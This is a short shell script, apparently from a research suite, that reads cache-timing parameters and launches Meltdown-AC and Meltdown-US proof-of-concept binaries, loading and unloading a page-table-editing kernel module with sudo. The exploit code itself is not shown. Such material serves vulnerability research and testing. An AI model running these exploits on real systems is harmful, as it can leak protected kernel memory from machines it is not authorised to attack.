# Get pagesize and threshold
pagesize=`./libcache/get_pagesize`
threshold=`./libcache/get_threshold`
printf "pagesize = $pagesize, threshold = $threshold\n\n"

# Exploit
# meltdown_ac
./meltdown/AC/poc $pagesize $threshold
# meltdown_us
sudo insmod libpte/module/pteditor.ko
./meltdown/US/poc $pagesize $threshold
sudo rmmod libpte/module/pteditor.ko

